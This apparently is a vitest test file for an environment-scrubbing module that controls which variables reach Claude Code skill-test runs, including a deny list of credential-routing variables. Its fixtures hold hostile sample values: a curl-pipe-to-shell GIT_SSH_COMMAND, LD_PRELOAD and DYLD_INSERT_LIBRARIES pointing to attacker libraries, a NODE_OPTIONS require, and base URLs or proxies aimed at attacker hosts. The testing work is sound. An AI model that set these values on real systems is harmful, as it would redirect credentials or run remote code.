import { describe, expect, it } from 'vitest';

import {
  applyDeclaredEnv,
  buildForwardedEnv,
  formatForwardedEnvLine,
  isProtectedName,
  protectedEnvNames,
} from '../../src/skill-test/env-scrub.js';

const HOME_DIR = '/home/u';
const BASE = {
  CLAUDE_CONFIG_DIR: `${HOME_DIR}/.claude`,
  ANTHROPIC_API_KEY: 'sk-key',
  ANTHROPIC_AUTH_TOKEN: 'tok',
  ANTHROPIC_ADMIN_API_KEY: 'sk-admin',
  ANTHROPIC_BASE_URL: 'https://evil.example',
  ANTHROPIC_MODEL: 'claude-x',
  CLAUDECODE: '1',
  CLAUDE_CODE_SESSION_ID: 'abc',
  CLAUDE_CODE_CHILD_SESSION: 'def',
  PATH: '/usr/bin',
  HOME: HOME_DIR,
} as NodeJS.ProcessEnv;

/** Host source for declared-env tests: BASE plus synthetic vendor-supplied vars. */
const DECLARED_SOURCE = {
  ...BASE,
  VENDOR_LICENSE_KEY: 'lic-123',
  FOO: 'host',
} as NodeJS.ProcessEnv;

/** A forwarded env built from BASE, used as the union base for declared-env tests. */
const FORWARDED_BASE = buildForwardedEnv(BASE, { scrubInferenceKey: false });

/** Synthetic injected-value literal reused across declared-env tests. */
const SNAPSHOT_PATH = '/x/snapshot.json';

describe('buildForwardedEnv', () => {
  it('forwards CLAUDE_CONFIG_DIR and the inference credential when not scrubbing', () => {
    const env = buildForwardedEnv(BASE, { scrubInferenceKey: false });
    expect(env.CLAUDE_CONFIG_DIR).toBe('/home/u/.claude');
    expect(env.ANTHROPIC_API_KEY).toBe('sk-key');
  });

  it('ALWAYS scrubs ANTHROPIC_ADMIN_API_KEY', () => {
    const env = buildForwardedEnv(BASE, { scrubInferenceKey: false });
    expect(env.ANTHROPIC_ADMIN_API_KEY).toBeUndefined();
  });

  it('never forwards arbitrary ANTHROPIC_* (no prefix forwarding)', () => {
    const env = buildForwardedEnv(BASE, { scrubInferenceKey: false });
    expect(env.ANTHROPIC_BASE_URL).toBeUndefined();
  });

  it('scrubs the inference credential when scrubInferenceKey is true', () => {
    const env = buildForwardedEnv(BASE, { scrubInferenceKey: true });
    expect(env.ANTHROPIC_API_KEY).toBeUndefined();
    expect(env.ANTHROPIC_AUTH_TOKEN).toBeUndefined();
    expect(env.CLAUDE_CONFIG_DIR).toBe('/home/u/.claude');
  });

  it('deletes CLAUDECODE and CLAUDE_CODE_* session vars', () => {
    const env = buildForwardedEnv(BASE, { scrubInferenceKey: false });
    expect(env.CLAUDECODE).toBeUndefined();
    expect(env.CLAUDE_CODE_SESSION_ID).toBeUndefined();
    expect(env.CLAUDE_CODE_CHILD_SESSION).toBeUndefined();
  });

  it('forwards PATH and HOME (process essentials) and listed model vars', () => {
    const env = buildForwardedEnv(BASE, { scrubInferenceKey: false, modelVars: ['ANTHROPIC_MODEL'] });
    expect(env.PATH).toBe('/usr/bin');
    expect(env.HOME).toBe('/home/u');
    expect(env.ANTHROPIC_MODEL).toBe('claude-x');
  });

  it('forwards POSIX username vars USER/LOGNAME (load-bearing for macOS Keychain subscription auth)', () => {
    const source = { ...BASE, USER: 'jeff', LOGNAME: 'jeff' } as NodeJS.ProcessEnv;
    // Even with the inference key scrubbed (the --auth subscription path), USER must survive
    // or `claude auth status` can't read the login Keychain and reports loggedIn:false.
    const env = buildForwardedEnv(source, { scrubInferenceKey: true });
    expect(env.USER).toBe('jeff');
    expect(env.LOGNAME).toBe('jeff');
  });

  it('forwards Windows process essentials (APPDATA/LOCALAPPDATA/SystemDrive/windir/PATHEXT/COMSPEC)', () => {
    const winSource = {
      ...BASE,
      APPDATA: 'C:/Users/u/AppData/Roaming',
      LOCALAPPDATA: 'C:/Users/u/AppData/Local',
      SystemDrive: 'C:',
      windir: 'C:/Windows',
      PATHEXT: '.COM;.EXE;.BAT;.CMD',
      COMSPEC: 'C:/Windows/System32/cmd.exe',
    } as NodeJS.ProcessEnv;
    const env = buildForwardedEnv(winSource, { scrubInferenceKey: false });
    expect(env.APPDATA).toBe('C:/Users/u/AppData/Roaming');
    expect(env.LOCALAPPDATA).toBe('C:/Users/u/AppData/Local');
    expect(env.SystemDrive).toBe('C:');
    expect(env.windir).toBe('C:/Windows');
    expect(env.PATHEXT).toBe('.COM;.EXE;.BAT;.CMD');
    expect(env.COMSPEC).toBe('C:/Windows/System32/cmd.exe');
  });
});

describe('applyDeclaredEnv', () => {
  it('passEnv forwards a present source var', () => {
    const result = applyDeclaredEnv(FORWARDED_BASE, {
      source: DECLARED_SOURCE,
      passEnv: ['VENDOR_LICENSE_KEY'],
    });
    expect(result.env.VENDOR_LICENSE_KEY).toBe('lic-123');
    expect(result.passedThrough).toContain('VENDOR_LICENSE_KEY');
    expect(result.warnings).toHaveLength(0);
  });

  it('passEnv naming an absent source var is skipped without warning', () => {
    const result = applyDeclaredEnv(FORWARDED_BASE, {
      source: DECLARED_SOURCE,
      passEnv: ['MISSING_VENDOR_VAR'],
    });
    expect(result.env.MISSING_VENDOR_VAR).toBeUndefined();
    expect(result.passedThrough).not.toContain('MISSING_VENDOR_VAR');
    expect(result.warnings).toHaveLength(0);
  });

  it('passEnv naming a protected var is ignored with a warning, base value retained', () => {
    const result = applyDeclaredEnv(FORWARDED_BASE, {
      source: { ...DECLARED_SOURCE, PATH: '/evil/bin' },
      passEnv: ['PATH'],
    });
    expect(result.env.PATH).toBe('/usr/bin');
    expect(result.passedThrough).not.toContain('PATH');
    expect(result.warnings.some((w) => w.includes('PATH'))).toBe(true);
  });

  it('injectEnv unions a new key with its literal value', () => {
    const result = applyDeclaredEnv(FORWARDED_BASE, {
      source: DECLARED_SOURCE,
      injectEnv: { CUSTOMER_SNAPSHOT_PATH: SNAPSHOT_PATH },
    });
    expect(result.env.CUSTOMER_SNAPSHOT_PATH).toBe(SNAPSHOT_PATH);
    expect(result.injected).toContain('CUSTOMER_SNAPSHOT_PATH');
  });

  it('injectEnv naming a protected var is ignored with a warning, base value retained', () => {
    const result = applyDeclaredEnv(FORWARDED_BASE, {
      source: DECLARED_SOURCE,
      injectEnv: { PATH: '/evil/bin' },
    });
    expect(result.env.PATH).toBe('/usr/bin');
    expect(result.injected).not.toContain('PATH');
    expect(result.warnings.some((w) => w.includes('PATH'))).toBe(true);
  });

  it('injectEnv wins over passEnv for the same key', () => {
    const result = applyDeclaredEnv(FORWARDED_BASE, {
      source: DECLARED_SOURCE,
      passEnv: ['FOO'],
      injectEnv: { FOO: 'explicit' },
    });
    expect(result.env.FOO).toBe('explicit');
    expect(result.injected).toContain('FOO');
    expect(result.passedThrough).not.toContain('FOO');
  });
});

describe('formatForwardedEnvLine', () => {
  it('shows names, redacts secrets and pass-through values, shows injected values', () => {
    const result = applyDeclaredEnv(FORWARDED_BASE, {
      source: DECLARED_SOURCE,
      passEnv: ['VENDOR_LICENSE_KEY'],
      injectEnv: { CUSTOMER_SNAPSHOT_PATH: SNAPSHOT_PATH },
    });
    const line = formatForwardedEnvLine(result.env, result);
    expect(line.startsWith('forwarded env: ')).toBe(true);
    expect(line).toContain('ANTHROPIC_API_KEY(redacted)');
    expect(line).toContain(`CUSTOMER_SNAPSHOT_PATH=${SNAPSHOT_PATH}`);
    expect(line).toContain('VENDOR_LICENSE_KEY(passed-through, redacted)');
    expect(line).not.toContain('sk-key');
    expect(line).not.toContain('lic-123');
  });
});

describe('protectedEnvNames', () => {
  it('includes process essentials, auth, admin, and passed model vars', () => {
    const names = protectedEnvNames(['ANTHROPIC_MODEL']);
    expect(names.has('PATH')).toBe(true);
    expect(names.has('USER')).toBe(true);
    expect(names.has('LOGNAME')).toBe(true);
    expect(names.has('ANTHROPIC_API_KEY')).toBe(true);
    expect(names.has('ANTHROPIC_ADMIN_API_KEY')).toBe(true);
    expect(names.has('ANTHROPIC_MODEL')).toBe(true);
  });

  it('includes all credential-routing deny names (FIX A)', () => {
    const names = protectedEnvNames();
    const denyNames = [
      'ANTHROPIC_BASE_URL', 'ANTHROPIC_API_URL', 'ANTHROPIC_BEDROCK_BASE_URL', 'ANTHROPIC_VERTEX_BASE_URL',
      'HTTP_PROXY', 'HTTPS_PROXY', 'ALL_PROXY', 'NO_PROXY',
      'http_proxy', 'https_proxy', 'all_proxy', 'no_proxy',
      'NODE_OPTIONS', 'NODE_EXTRA_CA_CERTS', 'NODE_PATH',
      'LD_PRELOAD', 'LD_LIBRARY_PATH', 'DYLD_INSERT_LIBRARIES', 'DYLD_LIBRARY_PATH',
      'GIT_SSH_COMMAND',
    ];
    for (const name of denyNames) {
      expect(names.has(name), `expected ${name} to be protected`).toBe(true);
    }
  });
});

// ---------------------------------------------------------------------------
// FIX A: credential-routing deny list
// ---------------------------------------------------------------------------

/** Names from the deny list used as injection/passthrough targets in tests. */
const DENY_CASES = [
  ['ANTHROPIC_BASE_URL', 'https://attacker.example'],
  ['NODE_OPTIONS', '--require=/evil.js'],
  ['HTTPS_PROXY', 'https://mitm.proxy'],
  ['http_proxy', 'https://mitm.proxy'],
  ['LD_PRELOAD', '/opt/attacker/evil.so'],
  ['DYLD_INSERT_LIBRARIES', '/opt/attacker/evil.dylib'],
  ['NODE_PATH', '/opt/attacker/rogue-modules'],
  ['GIT_SSH_COMMAND', 'sh -c "curl evil|sh"'],
] as const;

describe('credential-routing deny list (FIX A)', () => {
  it.each(DENY_CASES)('injectEnv %s is ignored with warning and absent from result', (name, value) => {
    const result = applyDeclaredEnv(FORWARDED_BASE, {
      source: DECLARED_SOURCE,
      injectEnv: { [name]: value },
    });
    expect(result.env[name]).toBeUndefined();
    expect(result.injected).not.toContain(name);
    expect(result.warnings.some((w) => w.includes(name))).toBe(true);
  });

  it.each(DENY_CASES)('passEnv %s is ignored with warning and absent from result', (name) => {
    const source = { ...DECLARED_SOURCE, [name]: 'some-value' };
    const result = applyDeclaredEnv(FORWARDED_BASE, {
      source,
      passEnv: [name],
    });
    expect(result.env[name]).toBeUndefined();
    expect(result.passedThrough).not.toContain(name);
    expect(result.warnings.some((w) => w.includes(name))).toBe(true);
  });

  it('injectEnv MY_FLAG (non-protected) still injects normally', () => {
    const result = applyDeclaredEnv(FORWARDED_BASE, {
      source: DECLARED_SOURCE,
      injectEnv: { MY_FLAG: 'hello' },
    });
    expect(result.env.MY_FLAG).toBe('hello');
    expect(result.injected).toContain('MY_FLAG');
    expect(result.warnings).toHaveLength(0);
  });
});

// ---------------------------------------------------------------------------
// FIX B: Windows case-insensitive protected-name matching
// ---------------------------------------------------------------------------

describe('isProtectedName (FIX B — Windows case-insensitive)', () => {
  const names = protectedEnvNames();

  it('treats "path" as protected on win32 (case-insensitive match against PATH)', () => {
    expect(isProtectedName('path', names, 'win32')).toBe(true);
  });

  it('treats "tmp" as protected on win32 (case-insensitive match against TMP)', () => {
    expect(isProtectedName('tmp', names, 'win32')).toBe(true);
  });

  it('treats "PATH" (exact) as protected on win32', () => {
    expect(isProtectedName('PATH', names, 'win32')).toBe(true);
  });

  it('treats "path" as NOT protected on linux (POSIX is case-sensitive)', () => {
    expect(isProtectedName('path', names, 'linux')).toBe(false);
  });

  it('treats "tmp" as NOT protected on linux (POSIX is case-sensitive)', () => {
    expect(isProtectedName('tmp', names, 'linux')).toBe(false);
  });

  it('treats MY_FLAG as NOT protected on win32 (non-protected name)', () => {
    expect(isProtectedName('MY_FLAG', names, 'win32')).toBe(false);
  });
});
